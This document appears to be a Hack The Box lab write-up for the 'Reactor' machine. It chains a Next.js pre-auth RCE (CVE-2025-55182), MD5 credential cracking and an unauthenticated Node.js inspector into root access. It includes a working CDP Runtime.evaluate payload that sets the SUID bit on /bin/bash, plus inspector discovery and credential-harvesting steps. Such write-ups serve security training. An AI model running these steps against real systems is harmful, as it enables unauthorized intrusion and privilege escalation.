# Reactor — HTB Machine

![Platform](https://img.shields.io/badge/Platform-Hack%20The%20Box-9FEF00)
![Difficulty](https://img.shields.io/badge/Difficulty-Hard-red)
![Type](https://img.shields.io/badge/Type-Linux-blue)
![Status](https://img.shields.io/badge/Status-Completed-success)

A pre-auth RCE in Next.js leads to a foothold, weak MD5 credentials pivot to SSH access, and an unauthenticated Node.js debugging interface hands over root.

## Techniques Used

- Nmap port + version scanning
- Framework fingerprinting (Wappalyzer)
- Metasploit pre-auth RCE exploitation (CVE-2025-55182 / React2Shell)
- Plaintext + SQLite credential harvesting
- MD5 hash cracking with Hashcat
- Process/port enumeration
- Chrome DevTools Protocol (CDP) exploitation via a custom Python WebSocket client
- SUID-based privilege escalation

## Attack Summary

```text
Nmap --> 22 (ssh), 3000 (Next.js)
Wappalyzer --> Next.js 15.0.3
CVE-2025-55182 --> Metasploit --> shell as node
.env + reactor.db --> MD5 hashes --> cracked --> engineer:reactor1
SSH as engineer --> user.txt
Root-owned node process --> Inspector on loopback:9229
Unauthenticated CDP --> Runtime.evaluate --> chmod u+s /bin/bash --> root.txt
```

## Key Vulnerabilities

**CVE-2025-55182 ("React2Shell")** — Pre-authentication remote code execution in Next.js 15.0.3, triggered via a crafted POST request.

**Unauthenticated Node.js Inspector (CDP)** — A root-owned Node process runs with `--inspect` bound to loopback. The Chrome DevTools Protocol has no built-in authentication, so any local user reaching the port can execute arbitrary JavaScript in the process's context — root, in this case.

```bash
# Conceptual vulnerable pattern
node --inspect=127.0.0.1:9229 worker.js   # running as root, no auth on CDP
```

## Request Analysis

### Fingerprinting
```text
X-Powered-By: Next.js
x-nextjs-cache: HIT
```

### Inspector Discovery
```bash
curl -s http://localhost:9229/json
# Returns webSocketDebuggerUrl with no authentication required
```

## Exploit Payload

**CDP Runtime.evaluate (via custom WebSocket client):**
```json
{
  "id": 1,
  "method": "Runtime.evaluate",
  "params": {
    "expression": "require('child_process').execSync('chmod u+s /bin/bash').toString()",
    "includeCommandLineAPI": true
  }
}
```

## Why It Works

| Factor | Explanation |
|---|---|
| Pre-auth RCE | Next.js executes attacker code from an unauthenticated POST request |
| Weak credential storage | MD5 hashes in a locally-readable SQLite DB crack quickly |
| Password reuse | Cracked app credential grants direct SSH access |
| Unauthenticated debug interface | CDP trusts any client that reaches the port — no login, no token |

## References

- [CVE-2025-55182 PoC (React2Shell)](https://github.com/acheong08/CVE-2025-55182-poc/tree/main)
- Node.js Inspector / Chrome DevTools Protocol documentation
